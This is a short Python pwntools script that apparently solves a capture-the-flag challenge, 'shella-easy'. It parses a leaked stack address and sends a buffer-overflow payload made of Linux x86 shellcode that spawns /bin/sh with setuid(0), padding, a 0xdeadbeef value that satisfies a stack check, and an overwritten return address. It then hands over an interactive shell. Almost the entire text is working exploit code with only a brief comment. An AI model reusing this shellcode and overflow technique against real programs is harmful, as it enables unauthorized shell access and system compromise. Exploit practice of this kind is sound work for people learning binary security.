from pwn import *

target = process("./shella-easy")

# need too make sure value in middle of stack has correct value to make sure main actually returns
# parse address -> add shell code -> pad until intermediate variable -> set var to correct value -> pad to
# return address -> set return address to array address to execute shell code

arrayAddr = target.recvuntil(b"a ")
arrayAddr = target.recvuntil(b" ").strip(b" ")
arrayAddr = int(arrayAddr, 16)
arrayAddr = p32(arrayAddr)

shellcode = b"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
padding1 = b"0" * (64 - len(shellcode))
newVal = p32(0xdeadbeef)
padding2 = b"1" * (0xc - len(newVal))

payload = shellcode + padding1 + newVal + padding2 + arrayAddr

target.sendline(payload)

target.interactive()